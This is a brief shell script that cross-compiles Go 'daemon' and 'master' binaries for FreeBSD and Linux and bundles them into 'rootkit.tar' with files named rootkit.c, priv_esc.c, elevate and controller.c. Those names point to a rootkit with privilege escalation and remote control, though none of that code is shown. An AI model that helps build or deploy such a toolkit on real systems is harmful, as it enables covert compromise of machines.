#!/bin/sh

env GOOS=freebsd GOARCH=386 go build daemon.go
env GOOS=linux GOARCH=386 go build master.go
# env GOOS=freebsd GOARCH=386 go build master.go

tar -cvf rootkit.tar controller.c elevate install Makefile priv_esc.c rootkit.c daemon uninstall.sh master log remote kvm_tmp.c